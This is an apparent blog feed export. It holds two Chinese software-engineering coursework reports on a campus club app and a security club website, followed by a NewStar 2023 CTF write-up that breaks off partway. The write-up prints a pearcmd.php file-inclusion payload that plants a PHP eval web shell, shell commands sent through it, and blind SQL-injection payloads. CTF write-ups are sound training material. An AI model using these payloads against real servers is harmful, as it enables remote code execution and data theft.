    <link href="/2023/12/04/2023-12-4-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E9%87%8C%E7%A8%8B%E7%A2%913/"/>
    <url>/2023/12/04/2023-12-4-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E9%87%8C%E7%A8%8B%E7%A2%913/</url>
    
    <content type="html"><![CDATA[<h1 id="软件工程第二组-Demo-初成果演示"><a href="#软件工程第二组-Demo-初成果演示" class="headerlink" title="软件工程第二组(Demo)初成果演示"></a>软件工程第二组(Demo)初成果演示</h1><h2 id="分工"><a href="#分工" class="headerlink" title="分工:"></a>分工:</h2><p>高铮男:网页端制作</p><p>胡纪福:APP端制作</p><p>陈帅:网页端制作</p><p>韩汝代:类图，用例图</p><p>周诗乔:数据流图</p><p>竺柯杰:顺序图</p><h2 id="iClub项目背景及简介"><a href="#iClub项目背景及简介" class="headerlink" title="iClub项目背景及简介"></a>iClub项目背景及简介</h2><p>大学里有各种各样的社团，但是没有一个集中的平台综合管理这些社团信息，因此学生也很难全面了解到学校的社团以及社团活动。因此本项目面向对象为大学全体学生，实现校园社团管理功能，例如检索校内所有社团、申请加入，参加社团活动等。</p><h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析:"></a>需求分析:</h2><h3 id="非社长学生"><a href="#非社长学生" class="headerlink" title="非社长学生"></a>非社长学生</h3><p>1.校内所有学生账号密码已根据学号初始化，无需注册，直接登录。</p><p>2.非社长学生可以修改自己的基本信息（密码、昵称、手机号、头像等等信息）。</p><p>3.非社长学生可以查询所有社团的基本信息、已经加入的社团。</p><p>4.非社长学生可以填写社团申请表，社长审核通过后可成为社员。</p><p>5.非社长学生可以查询所有社团发布的活动、已经报名的活动，报名符合条件的活动。</p><p>6.非社长学生可以接收相关活动、社团的通知。</p><p>7.非社长学生可以在留言板留言并查看留言板所有内容、我的留言以及评论。</p><h3 id="社长学生"><a href="#社长学生" class="headerlink" title="社长学生"></a>社长学生</h3><p>1.社长学生是特殊的普通学生，拥有普通学生的所有功能。</p><p>2.社团、社长信息由后台管理员管理。</p><p>3.社长可以修改本社团基本信息（名称、Logo、社团简介等）。</p><p>4.社长可以管理本社团活动（发布活动、修改活动信息、删除活动）。</p><p>5.社长可以管理本社团社员（审核入社申请、删除社员、查看社员信息）。</p><p>6.社长可以管理本社团通知（发布通知，删除通知）。</p><p>7.社长可以将社长职位转让给某社员。</p><h3 id="后台管理员"><a href="#后台管理员" class="headerlink" title="后台管理员"></a>后台管理员</h3><ol><li>后台管理员进行学生、社团的增、删。</li><li>后台管理员审批社长发布的活动是否通过。</li><li>后台管理员可以修改社长、社团信息（对数据库进行直接操作）。</li></ol><h2 id="用例图"><a href="#用例图" class="headerlink" title="用例图:"></a>用例图:</h2><p>根据软件需求和原型图制作绘制了以下用例图（为了更加清晰展示将软件的三个主体功能分为三个系统绘制）：</p><p><img src="/images/2023_12_4_third_milestone/%E7%94%A8%E4%BE%8B%E5%9B%BE%EF%BC%88%E6%8B%BC%E6%8E%A5%EF%BC%89.jpg" alt="用例图（拼接）"></p><h2 id="类图"><a href="#类图" class="headerlink" title="类图:"></a>类图:</h2><p><img src="/images/2023_12_4_third_milestone/%E7%B1%BB%E5%9B%BE.png" alt="类图"></p><h2 id="数据流图"><a href="#数据流图" class="headerlink" title="数据流图:"></a>数据流图:</h2><p><img src="/images/2023_12_4_third_milestone/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE.png" alt="数据流图"></p><h2 id="顺序图"><a href="#顺序图" class="headerlink" title="顺序图:"></a>顺序图:</h2><h3 id="报名活动"><a href="#报名活动" class="headerlink" title="报名活动:"></a>报名活动:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E6%8A%A5%E5%90%8D%E6%B4%BB%E5%8A%A8.png" alt="顺序图_报名活动"></p><h3 id="查看所有活动"><a href="#查看所有活动" class="headerlink" title="查看所有活动:"></a>查看所有活动:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E6%B4%BB%E5%8A%A8.png" alt="顺序图_查看所有活动"></p><h3 id="查看所有社团"><a href="#查看所有社团" class="headerlink" title="查看所有社团:"></a>查看所有社团:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E7%A4%BE%E5%9B%A2.png" alt="顺序图_查看所有社团"></p><h3 id="查看已经报名的活动"><a href="#查看已经报名的活动" class="headerlink" title="查看已经报名的活动:"></a>查看已经报名的活动:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E6%9F%A5%E7%9C%8B%E5%B7%B2%E6%8A%A5%E5%90%8D%E7%9A%84%E6%B4%BB%E5%8A%A8.png" alt="顺序图_查看已报名的活动"></p><h3 id="加入社团"><a href="#加入社团" class="headerlink" title="加入社团:"></a>加入社团:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E5%8A%A0%E5%85%A5%E7%A4%BE%E5%9B%A2.png" alt="顺序图_加入社团"></p><h3 id="社长创建活动"><a href="#社长创建活动" class="headerlink" title="社长创建活动:"></a>社长创建活动:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E7%A4%BE%E9%95%BF%E5%88%9B%E5%BB%BA%E6%B4%BB%E5%8A%A8.png" alt="顺序图_社长创建活动"></p><h3 id="社长转让"><a href="#社长转让" class="headerlink" title="社长转让:"></a>社长转让:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E7%A4%BE%E9%95%BF%E8%BD%AC%E8%AE%A9.png" alt="顺序图_社长转让"></p><h2 id="APP端"><a href="#APP端" class="headerlink" title="APP端:"></a>APP端:</h2><p><img src="/images/2023_12_4_third_milestone/4f4b69ccef768c2f838880d3d7a8543.jpg" alt="4f4b69ccef768c2f838880d3d7a8543"></p><p><img src="/images/2023_12_4_third_milestone/5d4d03b8a7958ea1f3cb97980113db1.jpg" alt="5d4d03b8a7958ea1f3cb97980113db1"></p><p><img src="/images/2023_12_4_third_milestone/9fb199579e2f6aa550e4f8f66d06138.jpg" alt="9fb199579e2f6aa550e4f8f66d06138"></p><p><img src="/images/2023_12_4_third_milestone/2ebb597136e7ab2c88d2fc1103d2cad.jpg" alt="2ebb597136e7ab2c88d2fc1103d2cad"></p><p><img src="/images/2023_12_4_third_milestone/bbcebd8ab4eaea7360b797f9be0af4a.jpg" alt="bbcebd8ab4eaea7360b797f9be0af4a"></p><h2 id="网页端"><a href="#网页端" class="headerlink" title="网页端:"></a>网页端:</h2><p>网页端根据ui设计的基础，进行改善从而完成首页，协会成员和联系的界面:</p><h3 id="首页"><a href="#首页" class="headerlink" title="首页:"></a>首页:</h3><p><img src="/images/2023_12_4_third_milestone/image-20231203205816231.png" alt="image-20231203205816231"></p><p><img src="/images/2023_12_4_third_milestone/image-20231203205906126.png" alt="image-20231203205906126"></p><p><img src="/images/2023_12_4_third_milestone/image-20231203205939250.png" alt="image-20231203205939250"></p><p><img src="/images/2023_12_4_third_milestone/image-20231203210003859.png" alt="image-20231203210003859"></p><h3 id="协会成员"><a href="#协会成员" class="headerlink" title="协会成员:"></a>协会成员:</h3><p><img src="/images/2023_12_4_third_milestone/image-20231203210137947.png" alt="image-20231203210137947"></p><h3 id="联系"><a href="#联系" class="headerlink" title="联系:"></a>联系:</h3><p><img src="/images/2023_12_4_third_milestone/image-20231203210236649.png" alt="image-20231203210236649"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>软件工程第二组用例图，类图，流程图，顺序图分析设计报告</title>
    <link href="/2023/11/20/2023-11-20-second_milestone/"/>
    <url>/2023/11/20/2023-11-20-second_milestone/</url>
    
    <content type="html"><![CDATA[<h1 id="软件工程第二组用例图，类图，流程图，顺序图分析设计报告"><a href="#软件工程第二组用例图，类图，流程图，顺序图分析设计报告" class="headerlink" title="软件工程第二组用例图，类图，流程图，顺序图分析设计报告"></a>软件工程第二组用例图，类图，流程图，顺序图分析设计报告</h1><h2 id="分工"><a href="#分工" class="headerlink" title="分工:"></a>分工:</h2><p>高铮男:网页类图和用例图</p><p>胡纪福:APP类图和用例图</p><p>陈帅:网页系统的数据流图</p><p>周诗乔:APP系统的数据流图</p><p>韩汝代:APP用例的顺序图</p><p>竺柯杰:网页用例的顺序图</p><h2 id="网络空间安全社团网页"><a href="#网络空间安全社团网页" class="headerlink" title="网络空间安全社团网页:"></a>网络空间安全社团网页:</h2><h3 id="用例图："><a href="#用例图：" class="headerlink" title="用例图："></a>用例图：</h3><p>根据网络空间安全社团的ui设计界面对用例图进行分析设计。</p><h4 id="首页："><a href="#首页：" class="headerlink" title="首页："></a>首页：</h4><p>首页ui:<br><img src="/images/2023_11_20_second_milestone/image-20231118162312165.png" alt="image-20231118162312165"></p><p>首页的面向社员和管理员，两类人员，社员只拥有对首页的观阅功能，管理员拥有观阅功能和对首页内容修改的功能:</p><h5 id="首页用例图"><a href="#首页用例图" class="headerlink" title="首页用例图:"></a>首页用例图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231120103811018.png" alt="image-20231120103811018"></p><h4 id="社团介绍页面"><a href="#社团介绍页面" class="headerlink" title="社团介绍页面:"></a>社团介绍页面:</h4><p>社团介绍页面ui:<br><img src="/images/2023_11_20_second_milestone/image-20231118162800500.png" alt="image-20231118162800500"></p><p>社团介绍页面面向社员和管理员，两类人员，社员只拥有对社团信息、奖项、人员信息和合照的观阅功能，管理员额外拥有对当前页面的信息修改功能。</p><h5 id="社团介绍界面用例图"><a href="#社团介绍界面用例图" class="headerlink" title="社团介绍界面用例图:"></a>社团介绍界面用例图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231120103958045.png" alt="image-20231120103958045"></p><h4 id="社团公告界面："><a href="#社团公告界面：" class="headerlink" title="社团公告界面："></a>社团公告界面：</h4><p>社团公告界面ui：<br><img src="/images/2023_11_20_second_milestone/image-20231118163635092.png" alt="image-20231118163635092"></p><p>社团介绍页面面向社员和管理员，两类人员，社员只拥有对网页中公告的查阅功能，管理员拥有额外对公告删除和发布的公告处理功能</p><h5 id="社团公告界面用例图"><a href="#社团公告界面用例图" class="headerlink" title="社团公告界面用例图:"></a>社团公告界面用例图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231120104419813.png" alt="image-20231120104419813"></p><h4 id="竞赛中心界面"><a href="#竞赛中心界面" class="headerlink" title="竞赛中心界面:"></a>竞赛中心界面:</h4><p>竞赛中心界面ui:<br><img src="/images/2023_11_20_second_milestone/image-20231118164809014.png" alt="image-20231118164809014"></p><p>社团介绍页面面向社员和管理员，两类人员,社员可以查阅公开赛、内部赛的信息和自己已经报名的竞赛信息，管理员拥有对公开赛和内部赛的查阅功能，以及删除竞赛活动和发布竞赛活动的活动处理功能:</p><h5 id="竞赛中心界面用例图"><a href="#竞赛中心界面用例图" class="headerlink" title="竞赛中心界面用例图:"></a>竞赛中心界面用例图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231120104605766.png" alt="image-20231120104605766"></p><h4 id="链接界面"><a href="#链接界面" class="headerlink" title="链接界面:"></a>链接界面:</h4><p>链接界面ui:<br><img src="/images/2023_11_20_second_milestone/image-20231118183712830.png" alt="image-20231118183712830"></p><p>社团介绍页面面向社员和管理员，两类人员,社员只有对博客链接、资源和联系我们的查阅功能，管理员拥有对博客链接信息，资源信息，联系我们的信息的处理功能</p><h5 id="链接界面用例图"><a href="#链接界面用例图" class="headerlink" title="链接界面用例图:"></a>链接界面用例图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231120104753303.png" alt="image-20231120104753303"></p><h4 id="练习场界面"><a href="#练习场界面" class="headerlink" title="练习场界面:"></a>练习场界面:</h4><p>练习场界面ui:<br><img src="/images/2023_11_20_second_milestone/image-20231118185058785.png" alt="image-20231118185058785"></p><p>社团介绍页面面向社员和管理员，两类人员,社员拥有对各类题型题目的查阅功能，对题目的打开和测试，以及对指定题目的搜索功能，管理员拥有额外对题目的发布和删除功能</p><h5 id="练习场界面用例图"><a href="#练习场界面用例图" class="headerlink" title="练习场界面用例图:"></a>练习场界面用例图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231118193056383.png" alt="image-20231118193056383"></p><h4 id="个人中心界面"><a href="#个人中心界面" class="headerlink" title="个人中心界面:"></a>个人中心界面:</h4><p>个人中心界面ui:<br><img src="/images/2023_11_20_second_milestone/image-20231118193527654.png" alt="image-20231118193527654"></p><p>个人中心的操作界面，只面向社员，社员拥有对该界面的查阅和编辑个人信息的功能</p><h5 id="个人信息界面用例图"><a href="#个人信息界面用例图" class="headerlink" title="个人信息界面用例图:"></a>个人信息界面用例图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231118195032429.png" alt="image-20231118195032429"></p><h3 id="类图"><a href="#类图" class="headerlink" title="类图:"></a>类图:</h3><h5 id="首页类图"><a href="#首页类图" class="headerlink" title="首页类图:"></a>首页类图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231118212000182.png" alt="image-20231118212000182"></p><h5 id="社团介绍页面类图"><a href="#社团介绍页面类图" class="headerlink" title="社团介绍页面类图:"></a>社团介绍页面类图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231118225249988.png" alt="image-20231118225249988"></p><h5 id="社团公告界面类图"><a href="#社团公告界面类图" class="headerlink" title="社团公告界面类图:"></a>社团公告界面类图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231118231142322.png" alt="image-20231118231142322"></p><h5 id="竞赛中心界面类图"><a href="#竞赛中心界面类图" class="headerlink" title="竞赛中心界面类图:"></a>竞赛中心界面类图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231119012614739.png" alt="image-20231119012614739"></p><h5 id="链接界面类图"><a href="#链接界面类图" class="headerlink" title="链接界面类图:"></a>链接界面类图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231119013509291.png" alt="image-20231119013509291"></p><h5 id="练习场界面类图"><a href="#练习场界面类图" class="headerlink" title="练习场界面类图:"></a>练习场界面类图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231119130001581.png" alt="image-20231119130001581"></p><h5 id="个人中心界面类图"><a href="#个人中心界面类图" class="headerlink" title="个人中心界面类图:"></a>个人中心界面类图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231119131536125.png" alt="image-20231119131536125"></p><h3 id="网页的数据流图"><a href="#网页的数据流图" class="headerlink" title="网页的数据流图:"></a>网页的数据流图:</h3><h5 id="Goose网站数据流程图"><a href="#Goose网站数据流程图" class="headerlink" title="Goose网站数据流程图:"></a>Goose网站数据流程图:</h5><p><img src="/images/2023_11_20_second_milestone/wps1-1700442602419-1.jpg" alt="img"> </p><p>题库信息管理：</p><p>管理员发出对应的题目信息进入题库，社员可以拉取对应的题目，然后完成后可以填写答案，系统判断答案对错，将对应的判断信息返回</p><p>网页公告管理：</p><p>社团会发布各种各样的公告，管理员将对应的公告信息发布，以便社员能浏览</p><p>竞赛信息管理：</p><p>社团举办网络安全赛事，管理员将赛事信息录入，录入后社员可以根据自己的需求报名，报名信息进入竞赛报名审批表，管理员进行审批，审批后将对应的审批信息发送给社员</p><p>个人信息管理：</p><p>社员可以管理自己个人信息，同时其它社员也可以访问社员空间，查看能展示的个人信息</p><p>社团信息管理：</p><p>管理员发布社团信息，诸如社团获奖情况，社团近照，社员可以查看</p><h3 id="网页用例的顺序图"><a href="#网页用例的顺序图" class="headerlink" title="网页用例的顺序图:"></a>网页用例的顺序图:</h3><h5 id="个人中中心信息修改："><a href="#个人中中心信息修改：" class="headerlink" title="个人中中心信息修改："></a>个人中中心信息修改：</h5><p><img src="/images/2023_11_20_second_milestone/wps2-1700442695271-5.jpg" alt="img"> </p><p>社员在个人信息页面，通过修改姓名方法去修改信息，通过获取姓名方法获得新的姓名</p><h5 id="公开赛活动删除："><a href="#公开赛活动删除：" class="headerlink" title="公开赛活动删除："></a>公开赛活动删除：</h5><p><img src="/images/2023_11_20_second_milestone/wps3-1700442695271-6.jpg" alt="img"> </p><p>管理员进入竞赛中心页面，通过修改公开赛活动进入公开赛页面，通过修改当前页面活动进入公开赛活动合集，修改活动内容。通过获取活动内容、获取当前页面活动、获取公开赛活动获得新的活动信息。</p><h5 id="更改公告标题："><a href="#更改公告标题：" class="headerlink" title="更改公告标题："></a>更改公告标题：</h5><p><img src="/images/2023_11_20_second_milestone/wps4-1700442695270-4.jpg" alt="img"> </p><p>管理员进入社团公告页面，通过修改公告标题方法更改公告标题，通过获取公告标题方法获取新的社团公告标题，再通过获取当前页面公告方法获取新信息</p><h5 id="社团介绍信息修改："><a href="#社团介绍信息修改：" class="headerlink" title="社团介绍信息修改："></a>社团介绍信息修改：</h5><p><img src="/images/2023_11_20_second_milestone/wps5-1700442695270-3.jpg" alt="img"> </p><p>管理员进入社团介绍页面，通过修改社团干部信息方法进入人员信息页面，通过修改姓名方法修改干部姓名，再通过获取姓名、获取社团干部信息、获取页面名称获取新信息</p><h5 id="练习场题目上传："><a href="#练习场题目上传：" class="headerlink" title="练习场题目上传："></a>练习场题目上传：</h5><p><img src="/images/2023_11_20_second_milestone/wps6-1700442695271-7.jpg" alt="img"> </p><p>管理员打开练习场页面，查看题目列表，通过上床题目将题目上传数据库，在练习场页面获取新的题目列表。</p><h2 id="社团管理APP-iClub"><a href="#社团管理APP-iClub" class="headerlink" title="社团管理APP(iClub):"></a>社团管理APP(iClub):</h2><h3 id="iClub项目背景及简介"><a href="#iClub项目背景及简介" class="headerlink" title="iClub项目背景及简介:"></a>iClub项目背景及简介:</h3><p>大学里有各种各样的社团，但是没有一个集中的平台综合管理这些社团信息，因此学生也很难全面了解到学校的社团以及社团活动。因此本项目面向对象为大学全体学生，实现校园社团管理功能，例如检索校内所有社团、申请加入，参加社团活动等。</p><h3 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析:"></a>需求分析:</h3><h4 id="非社长学生"><a href="#非社长学生" class="headerlink" title="非社长学生:"></a>非社长学生:</h4><p>1.校内所有学生账号密码已根据学号初始化，无需注册，直接登录。</p><p>2.非社长学生可以修改自己的基本信息（密码、昵称、手机号、头像等等信息）。</p><p>3.非社长学生可以查询所有社团的基本信息、已经加入的社团。</p><p>4.非社长学生可以填写社团申请表，社长审核通过后可成为社员。</p><p>5.非社长学生可以查询所有社团发布的活动、已经报名的活动，报名符合条件的活动。</p><p>6.非社长学生可以接收相关活动、社团的通知。</p><p>7.非社长学生可以在留言板留言并查看留言板所有内容、我的留言以及评论。</p><h4 id="社长学生"><a href="#社长学生" class="headerlink" title="社长学生:"></a>社长学生:</h4><p>1.社长学生是特殊的普通学生，拥有普通学生的所有功能。</p><p>2.社团、社长信息由后台管理员管理。</p><p>3.社长可以修改本社团基本信息（名称、Logo、社团简介等）。</p><p>4.社长可以管理本社团活动（发布活动、修改活动信息、删除活动）。</p><p>5.社长可以管理本社团社员（审核入社申请、删除社员、查看社员信息）。</p><p>6.社长可以管理本社团通知（发布通知，删除通知）。</p><p>7.社长可以将社长职位转让给某社员。</p><h4 id="后台管理员"><a href="#后台管理员" class="headerlink" title="后台管理员:"></a>后台管理员:</h4><ol><li>后台管理员进行学生、社团的增、删。</li><li>后台管理员审批社长发布的活动是否通过。</li><li>后台管理员可以修改社长、社团信息（对数据库进行直接操作）。</li></ol><h3 id="用例图"><a href="#用例图" class="headerlink" title="用例图:"></a>用例图:</h3><p>根据软件需求和原型图制作绘制了以下用例图（为了更加清晰展示将软件的三个主体功能分为三个系统绘制）：</p><h4 id="社团管理用例"><a href="#社团管理用例" class="headerlink" title="社团管理用例:"></a>社团管理用例:</h4><p><img src="/images/2023_11_20_second_milestone/wps7.jpg" alt="img"> </p><h4 id="活动管理用例"><a href="#活动管理用例" class="headerlink" title="活动管理用例:"></a>活动管理用例:</h4><p><img src="/images/2023_11_20_second_milestone/wps8.jpg" alt="img"> </p><h4 id="用户资料用例"><a href="#用户资料用例" class="headerlink" title="用户资料用例:"></a>用户资料用例:</h4><p><img src="/images/2023_11_20_second_milestone/wps9.jpg" alt="img"> </p><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图:"></a>类图:</h3><p><img src="/images/2023_11_20_second_milestone/wps10.jpg" alt="img"> </p><h3 id="数据流图"><a href="#数据流图" class="headerlink" title="数据流图:"></a>数据流图:</h3><p><img src="/images/2023_11_20_second_milestone/wps1.png" alt="img"></p><p>初始社团信息由后台管理员提供</p><p>所有学生初始化个人信息由后台管理员初始化</p><p>社长拥有普通学生的所有的功能，非社长登陆之后没有社团管理功能，所有人可发布和查看帖子、评论</p><h3 id="APP用例顺序图"><a href="#APP用例顺序图" class="headerlink" title="APP用例顺序图:"></a>APP用例顺序图:</h3><p>普通学生通过永和信息修改页面输入新修改的信息再通过用户id查询用户表并对用户表进行修改</p><p><img src="/images/2023_11_20_second_milestone/wps2-1700443236234-18.jpg" alt="img"> </p><p>社长通过永和信息修改页面输入新修改的信息再通过用户id查询用户表并对用户表进行修改</p><p><img src="/images/2023_11_20_second_milestone/wps3-1700443236234-19.jpg" alt="img"> </p><p>普通学生通过加入社团页面加入社团，获取社团与用户id并通过其修改社团表和用户表完成加入社团这一行为</p><p><img src="/images/2023_11_20_second_milestone/wps4-1700443236234-20.jpg" alt="img"> </p><p>普通学生通过加入的社团查看页面查看加入社团，通过加入社团的id查询社团表并返回查询信息</p><p><img src="/images/2023_11_20_second_milestone/wps5-1700443236234-21.jpg" alt="img"> </p><p>普通学生通过社团查看页面查看社团，通过筛选条件与搜索关键词查询社团表并返回查询信息</p><p><img src="/images/2023_11_20_second_milestone/wps6-1700443236234-22.jpg" alt="img"> </p><p>社长通过查看管理的社团页面查看所管理社团，通过用户id查询用户表后通过返回表获取其所管理的社团id，之后在用其查询社团表活动所管理社团的信息</p><p><img src="/images/2023_11_20_second_milestone/wps7-1700443236234-23.jpg" alt="img"> </p><p>社长通过社长转让页面转让社长，获取用户与社团的id后使用其修改社团表和用户表的的信息完成社长转让</p><p><img src="/images/2023_11_20_second_milestone/wps8-1700443236235-24.jpg" alt="img"> </p><p>普通学生通过活动报名页面报名活动，通过获取的用户与活动id查询活动表和用户表修改其信息完成报名活动</p><p><img src="/images/2023_11_20_second_milestone/wps9-1700443236235-25.jpg" alt="img"> </p><p>普通学生通过活动查看页面查看活动，通过筛选条件与搜索关键词查询活动表并返回查询信息</p><p><img src="/images/2023_11_20_second_milestone/wps10-1700443236235-26.jpg" alt="img"> </p><p>普通学生通过活动报名查看页面查看报名的活动，通过报名活动的id查询社团表并返回查询信息</p><p><img src="/images/2023_11_20_second_milestone/wps11.jpg" alt="img"> </p><p>社长通过活动创建页面创建活动，社长输入活动信息后通过其信息修改活动表完成创建活动</p><p><img src="/images/2023_11_20_second_milestone/wps12.jpg" alt="img"> </p><p>社长通过活动报名信息查询界面查询活动报名信息，首先获取其所管理的社团id，并通过其喜欢寻社团表，通过其返回表的信息获取活动id，并利用其查询活动报名表，并返回活动信息</p><p><img src="/images/2023_11_20_second_milestone/wps13.jpg" alt="img"> </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Newstar新生赛2023第三周WP</title>
    <link href="/2023/11/03/2023-11-3-newstarweek3/"/>
    <url>/2023/11/03/2023-11-3-newstarweek3/</url>
    
    <content type="html"><![CDATA[<h1 id="Newstar新生赛2023第三周WP"><a href="#Newstar新生赛2023第三周WP" class="headerlink" title="Newstar新生赛2023第三周WP"></a>Newstar新生赛2023第三周WP</h1><h2 id="Include-🍐"><a href="#Include-🍐" class="headerlink" title="Include 🍐"></a>Include 🍐</h2><p>代码审计:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-comment">//将文件包含漏洞的伪协议ban掉了</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-comment">//提示phpinfo.php文件</span><br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>        <span class="hljs-comment"># Something in phpinfo.php!</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>访问phpinfo.php,并在响应内容中寻找flag：<br><img src="/images/2023-11-3-newstar-3/image-20231009114740035.png" alt="image-20231009114740035"></p><p>寻找一下register_argc_argv：</p><p><img src="/images/2023-11-3-newstar-3/image-20231009114850048.png" alt="image-20231009114850048"></p><p>发现register_argc_argv处于开启状态,所以可以[利用pearcmd.php本地文件包含（LFI):<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php<br></code></pre></td></tr></table></figure><p>使用bp上传payload,直接用浏览器上传会导致我们传入的内容被url编码化，导致php语言变形</p><p><img src="/images/2023-11-3-newstar-3/image-20231009115202206.png" alt="image-20231009115202206"></p><p>我们的文件被成功创建在&#x2F;tmp目录下,为test.php</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">?file=/tmp/test.php<br>=&gt;由于后面它给我们自动加上php,所以我们只需要传入文件名即可<br>?file=/tmp/test<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231009115338558.png" alt="image-20231009115338558"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>cmd=system(&quot;ls /&quot;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231009115429049.png" alt="image-20231009115429049"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>cmd=system(&quot;cat /flag&quot;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231009115526916.png" alt="image-20231009115526916"></p><h2 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h2><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27; GROUP BY 5 -- &#x27;<br></code></pre></td></tr></table></figure><p>得到字段数量为5</p><p>使用盲注：<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27;anD(1=1) -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010205748567.png" alt="image-20231010205748567"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27;anD(1=2) -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010215505760.png" alt="image-20231010215505760"></p><p>存在sql注入盲注点</p><p>爆表:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 